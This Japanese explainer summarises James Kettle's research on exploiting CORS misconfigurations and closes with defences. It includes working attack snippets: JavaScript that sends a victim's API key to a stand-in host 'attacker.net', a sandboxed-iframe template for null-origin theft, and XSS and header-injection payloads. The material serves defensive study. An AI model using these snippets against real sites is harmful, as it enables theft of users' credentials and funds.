## James Kettle: CORS設定不備の武器化

James Kettle（PortSwigger 社の Web セキュリティ研究責任者、Burp Suite の設計者の一人）は、2016〜2017 年にかけて「CORS 設定不備（CORS misconfiguration）」という当時あまり深刻視されていなかった問題を、実際の暗号通貨取引所やバグバウンティ対象を題材に「現実的に金銭・機密を奪える攻撃」として体系化した。本節では彼の講演資料と発表内容（AppSec EU 2017「Exploiting CORS Misconfigurations for Bitcoins and Bounties」）の技術的核心を、なぜその挙動が起きるのかという仕組みレベルまで掘り下げて解説する。

> ⚠️ **未取得の資料**: 「James Kettle: Exploiting CORS Misconfigurations for Bitcoins and Bounties（スライドPDF）」は自動取得できませんでした（理由: PDF ファイルサイズが取得ツールの上限 10MB を超過したため）。以下のURLからご自身で直接ご覧ください: https://portswigger.net/kb/papers/exploitingcorsmisconfigurations.pdf

> ⚠️ **未取得の資料**: 「James Kettle talk動画（AppSec EU 2017）」は自動取得できませんでした（理由: YouTube ページから字幕・トランスクリプトが抽出できず、ナビゲーション要素のみが返ったため）。以下のURLからご自身で直接ご覧ください: https://www.youtube.com/watch?v=wgkj4ZgxI4c

本節の技術内容は、上記スライド・講演とまったく同一の研究を著者本人（James Kettle）が PortSwigger 社サイトに文章化した公式記事から抽出している（同一著者・同一研究の一次相当ソース）。以下、その記事に基づいて解説する。

---

### 前提: CORS が「信頼関係」を作るという発想

まず出発点を確認する。ブラウザは既定で **同一オリジンポリシー（Same-Origin Policy, SOP）** を課しており、あるオリジン（スキーム＋ホスト＋ポートの三つ組）から取得したスクリプトは、別オリジンのレスポンス本文を JavaScript で読み取れない。CORS（Cross-Origin Resource Sharing）は、サーバー側が「このオリジンには読ませてよい」と明示的に宣言することで、この壁を意図的に緩めるための仕組みである。

サーバーは次のレスポンスヘッダで許可を出す。

```
Access-Control-Allow-Origin: https://example.com
```

これは「`https://example.com` から来たクロスオリジン読み取りを許す」という意味になる。ただし既定ではクッキーなどの認証情報（credentials）は送られない。認証済みセッションを跨いで読み取らせる（＝ログイン中のユーザーの権限で API を叩かせる）には、次のヘッダを追加する必要がある。

```
Access-Control-Allow-Credentials: true
```

Kettle が本質だと指摘するのは、この二つのヘッダの組み合わせが **オリジン間の「信頼関係」を生む** という点である。彼の言葉では次のとおり。

> 「これは信頼関係を作り出す。つまり `example.com` 側の XSS 脆弱性が、この（許可を出した）サイトにとって深刻な脅威になる。」

言い換えれば、`Access-Control-Allow-Origin` に載せた相手のセキュリティ品質を、自サイトのセキュリティに直結して抱え込むことになる。この「信頼を渡す相手を誰にするか」の判定を実装が誤ると、そのまま重大な情報漏洩につながる。ここが CORS 設定不備という脆弱性クラスの中心である。

> 出典: Exploiting CORS misconfigurations for Bitcoins and bounties（James Kettle / PortSwigger Research） — https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties

---

### 中心的な設定不備パターン

Kettle は、実装がオリジン判定を誤る典型パターンを分類している。以下、パターンごとに「なぜ危険か」「なぜその実装ミスが起きるか」を仕組みから説明する。

#### 1. オリジンの無検証な反射（Origin Reflection）

最も破壊的かつ頻出のパターン。サーバーが、リクエストの `Origin` ヘッダの値を **そのまま `Access-Control-Allow-Origin` に反射（echo back）** し、しかも `Access-Control-Allow-Credentials: true` を付けてしまう。

なぜこんな実装になるのか。`Access-Control-Allow-Origin` はワイルドカード `*` を書けるが、**`*` とクレデンシャル併用はブラウザ仕様で禁止**されている。そのため「複数の許可オリジンに対応したい」開発者が安直に「受け取った Origin をそのまま返す」実装に走りやすい。これは事実上「すべてのオリジンを credentials 付きで許可する」に等しく、任意の攻撃者サイトから被害者の認証済みデータを読み取れる。

Kettle が暗号通貨取引所で観測した実例（ホスト名は伏字）は次のとおり。攻撃者は無関係な JSFiddle 由来のオリジンを名乗っただけで、被害者の秘密 API キーを引き出せた。

```
GET /api/requestApiKey HTTP/1.1
Host: <redacted>
Origin: https://fiddle.jshell.net
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://fiddle.jshell.net
Access-Control-Allow-Credentials: true
{"[private API key]"}
```

なぜ成立するか: レスポンスの `Access-Control-Allow-Origin` が攻撃者の指定した `https://fiddle.jshell.net` に一致し、かつ `Allow-Credentials: true` なので、ブラウザは「このオリジンのスクリプトにレスポンス本文を読ませてよい」と判断する。被害者がログイン中に攻撃者ページを開くだけで、被害者のクッキー付きリクエストが飛び、返ってきた API キーを攻撃者の JS が読める。

この API キー窃取に使う攻撃コードは次のように単純である。

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://btc-exchange/api/requestApiKey',true);
req.withCredentials = true;          // 被害者のクッキーを同送させる
req.send();

function reqListener() {
  location='//attacker.net/log?key='+this.responseText; // 盗んだ本文を外部送出
}
```

なぜ `withCredentials = true` が必要か: これを設定しないとブラウザはクロスオリジンにクッキーを付けず、被害者の認証済みセッションを利用できない。この一行が「認証済みユーザーの権限で API を叩かせる」鍵になる。窃取した API キーはそのままアカウント乗っ取り（残高操作・出金）につながる。Kettle の報告では、ある取引所はこの報告を受けて **20 分で修正** した。それだけ即座に金銭被害に直結する重大性だったということである。

#### 2. ホワイトリストのパース誤り（URL Parsing Errors）

「反射はさすがにまずい」と気づいた開発者は、許可オリジンのホワイトリスト照合を実装する。ところがその照合ロジックが甘いと、やはり突破される。Kettle が挙げる典型は文字列の前方一致・後方一致による判定ミスである。

- **後方一致（suffix match）のミス**: 「`advisor.com` で終わるオリジンを信頼」という実装は、`definitelynotadvisor.com` も受理してしまう。攻撃者がそのドメインを取得すれば信頼される。
- **前方一致（prefix match）のミス**: 「`https://btc.net` で始まるオリジンを信頼」という実装は、`https://btc.net.evil.net` を受理してしまう。攻撃者は自分の `evil.net` 配下にサブドメインを立てるだけでよい。

なぜ起きるか: 開発者が「オリジンは URL の一部だから部分文字列で見れば十分」と考えてしまうため。実際にはオリジンは厳密に「スキーム＋ホスト＋ポートの完全一致」で比較しなければ安全にならない。部分一致は攻撃者が制御可能な文字列を前後に付け足すだけで崩れる。

さらに Kettle は **URL パーサの寛容さを突く** テクニックを示した。Safari（当時）は URL 内の異常な文字を許容するため、次のような一見不正な URL が通ってしまう。

```
http://example.com%60.hackxor.net/static/cors.html
```

`%60` はバッククォート `` ` `` の URL エンコードである。このページから発せられる `Origin` ヘッダは次のようになる。

```
Origin: http://example.com`.hackxor.net
```

なぜ危険か: サーバー側のホワイトリスト照合が、独自の（ブラウザとは異なる）URL パーサでこの Origin を解釈し、`` ` `` を区切り文字とみなして「ホストは `example.com`」と抽出してしまうと、`example.com` を信頼するホワイトリストを通過する。実際にレスポンスを受け取る攻撃者ページは `hackxor.net` 配下にある、という食い違い（パーサの解釈差、いわゆる parser differential）を突く攻撃である。ブラウザとサーバーが同じ文字列を別々に解釈することが根本原因になる。

#### 3. `null` オリジンの悪用

CORS 仕様には、オリジンが特定できない状況でブラウザが文字列 `null` を `Origin` として送る挙動がある。これはリダイレクト経由のリクエストや、`sandbox` 属性付き iframe、`data:` スキームの文書などで発生する。

問題は、開発者が「`null` はローカルファイルや内部テスト由来だから安全だろう」と考え、ホワイトリストに `null` を加えてしまう（あるいはデフォルトで `Access-Control-Allow-Origin: null` を返してしまう）ことである。

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

なぜ致命的か: `null` オリジンは **攻撃者が意図的に作り出せる**。攻撃者は sandbox 化した iframe の中に `data:` 文書を読み込ませることで、任意のスクリプトを `null` オリジンから実行できる。つまり「`null` を信頼する」は「攻撃者を信頼する」と同義になる。攻撃者側の HTML は次の形になる。

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src='data:text/html,<script>*ここにCORS窃取コード*</script>'></iframe>
```

なぜこの iframe で `null` になるか: `sandbox` 属性を付けた iframe（`allow-same-origin` を含めない）は、その文書のオリジンを強制的に不透明（opaque）＝ `null` にする。加えて `data:` URL 文書もオリジンを持たないため `null` になる。この中で走る `XMLHttpRequest`（`withCredentials=true`）から出るリクエストの `Origin` は `null` となり、標的サーバーの「`null` 許可」に合致する。`allow-scripts` はスクリプト実行の許可、`allow-top-navigation` は盗んだデータを外部へ遷移送出するために付けている。

Kettle はこの手法で、ある取引所から **ユーザーの暗号化されたウォレットのバックアップを一連の CORS リクエストで窃取できた** と報告している。暗号化されていても、オフラインで総当たり（ブルートフォース）できるため、実質的に資産奪取につながる。Google の PDF ビューアなど著名サービスでも `null` を許可していた例があったという。

#### 4. サブドメインの無条件信頼とプロトコル軽視

「自社サブドメインはすべて信頼する」というホワイトリストも危険を招く。二つの経路がある。

- **サブドメインの XSS 経由でスコープ拡大**: いずれか一つのサブドメイン（例: 外部ホスティングされた放置サブドメイン、あるいはユーザー投稿を扱うサブドメイン）に XSS があれば、そこを踏み台に「信頼された同一サブドメイン群」として本体 API へ credentials 付き CORS リクエストを送れる。前掲の「相手の XSS を抱え込む」信頼関係の帰結である。
- **プロトコルを区別しない信頼（HTTP を信頼する HTTPS）**: HTTPS サイトが、`http://` のサブドメインからの CORS を受理してしまうと、**中間者攻撃（MITM）** が可能になる。攻撃者はネットワーク上で平文 HTTP 通信を改竄し、任意のスクリプトを注入して、そこから HTTPS 本体へ CORS リクエストを発行できる。HTTPS の暗号化保護が、信頼した平文サブドメイン経由で骨抜きにされる。Kettle はこれを「逆向きの混在コンテンツ（reverse mixed-content）」と表現している。

なぜ起きるか: オリジン比較でスキーム（`http` か `https` か）を無視し、ホスト名の末尾一致だけで判定するため。オリジンは本来スキームまで含めて厳密一致すべきで、`http://sub.example.com` と `https://sub.example.com` は別オリジンとして扱わねばならない。

> 出典: Exploiting CORS misconfigurations for Bitcoins and bounties（James Kettle / PortSwigger Research） — https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties

---

### 応用: キャッシュポイズニングとの組み合わせ

Kettle は CORS 単体だけでなく、キャッシュ汚染（cache poisoning）と組み合わせて被害を拡大・永続化する手法も示した。

#### クライアントサイド・キャッシュポイズニング

レスポンスがリクエスト中のカスタムヘッダ値をエンコードせずに本文へ反射し、かつ `Vary: Origin` を付けていない場合、汚染されたレスポンスがブラウザキャッシュに残る。

```
GET / HTTP/1.1
Host: example.com
X-User-id: <svg/onload=alert(1)>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...
Invalid user: <svg/onload=alert(1)>
```

なぜ危険か: 攻撃者は CORS 経由で任意のカスタムヘッダ（`X-User-id`）を送り込め、その値が HTML として反射されキャッシュされる。以後、被害者がその URL に **直接アクセス** すると、キャッシュされた `<svg onload=alert(1)>` が実行される＝反射 XSS がキャッシュにより永続化する。`Vary: Origin` の欠落は、オリジンごとに別レスポンスを保持すべきキャッシュが一つの汚染レスポンスを使い回してしまう原因になる。

#### サーバーサイド・キャッシュポイズニング

`Origin` ヘッダ値を HTTP ヘッダの終端文字（CR = `\r` = `0x0d`）についてサニタイズしていない場合、ヘッダインジェクションが起きうる。

```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```

なぜ危険か: Internet Explorer / Edge（当時）は `\r` をヘッダ区切りとして解釈するため、注入した `Content-Type: text/html; charset=UTF-7` が有効になり、UTF-7 として解釈させることで XSS フィルタを回避した XSS を成立させられる。ブラウザ自身は不正ヘッダを送れないが、**Burp Suite などで手動リクエストをキャッシュサーバーへ送れば** 汚染レスポンスをキャッシュに載せられ、以後の正規ユーザーへ配信される。

> 出典: Exploiting CORS misconfigurations for Bitcoins and bounties（James Kettle / PortSwigger Research） — https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties

---

### 検出と防御

Kettle 自身が示した防御・検出の指針は次のとおり。攻撃手法そのものより、この防御原則こそが実務で最重要である。

**サーバー実装側の原則**

- **オリジンは完全一致で照合する**: スキーム・ホスト・ポートを含めた厳密一致のホワイトリストで判定し、前方一致・後方一致・部分文字列・緩い正規表現を使わない。前後一致の穴（`definitelynotadvisor.com`、`btc.net.evil.net`）はここから生まれる。
- **`Origin` の値を安易に反射しない**: 「受け取った Origin をそのまま `Access-Control-Allow-Origin` に返す」実装を避ける。どうしても複数オリジンに対応するなら、厳密なホワイトリストと突き合わせて一致したときだけ、その値を返す。
- **`null` をホワイトリストに入れない**: `null` は攻撃者が sandbox iframe や `data:` で自在に生成できるため、信頼対象にしてはならない。
- **CORS ヘッダを動的生成するときは `Vary: Origin` を付ける**: オリジンごとにレスポンスが変わることをキャッシュへ正しく伝え、クライアント／プロキシのキャッシュ汚染を防ぐ。
- **プロトコルを区別する**: `http://` と `https://` を別オリジンとして扱い、HTTPS サイトが HTTP オリジンを信頼しない（reverse mixed-content の遮断）。
- **真に公開してよいデータだけ `*` にする**: 認証情報を要さない完全公開 API に限って `Access-Control-Allow-Origin: *`（かつ credentials なし）を使う。機微データに `*` と credentials を同時適用しない（仕様上そもそも不可だが、反射で疑似的に実現してしまう罠に注意）。

**検出**

Kettle は「Burp Suite のスキャナが本節で述べたすべての不備を検出・報告する」と述べている。加えて、`Origin: https://<自分が制御する適当なドメイン>` を付けてリクエストを送り、レスポンスの `Access-Control-Allow-Origin` にそのオリジンが反射され、かつ `Access-Control-Allow-Credentials: true` が付くかを確認するのが、反射型不備の最も基本的なチェックになる。

なお本節の攻撃手順は **防御目的（自組織の設定検証・脆弱性理解）のための解説** であり、実在する第三者サービスや本番環境に対する無許可のテスト・破壊的操作を行ってはならない。学習・検証は PortSwigger が公開している練習用ラボ（`https://portswigger.net/web-security/cors`）など、許可された環境で行うこと。

> 出典: Exploiting CORS misconfigurations for Bitcoins and bounties（James Kettle / PortSwigger Research） — https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties

---

### まとめ

James Kettle の研究の核心は、CORS 設定不備を「マイナーな設定ミス」から「認証済みユーザーの機密（API キー・暗号ウォレット）を確実に奪える実害ある脆弱性クラス」へと引き上げたことにある。技術的要点は次に集約される。

- `Access-Control-Allow-Origin` ＋ `Access-Control-Allow-Credentials: true` は、相手オリジンのセキュリティ品質を自サイトに取り込む「信頼関係」を作る。
- 主要な不備は、(1) Origin の無検証反射、(2) 前方／後方一致・パーサ解釈差によるホワイトリスト突破、(3) 攻撃者が生成可能な `null` オリジンの信頼、(4) サブドメイン・プロトコルの無条件信頼、の四類型。
- キャッシュポイズニングと組み合わせると、被害が永続化・拡散する。
- 唯一堅牢な防御は「スキーム・ホスト・ポート完全一致の厳密ホワイトリスト」であり、部分一致・反射・`null` 信頼はすべて破られる。

この分類と「信頼を渡す相手を厳密一致でしか選ばない」という原則は、発表から年月を経た現在（2020 年代）でも CORS 実装レビューの基準としてそのまま通用する。
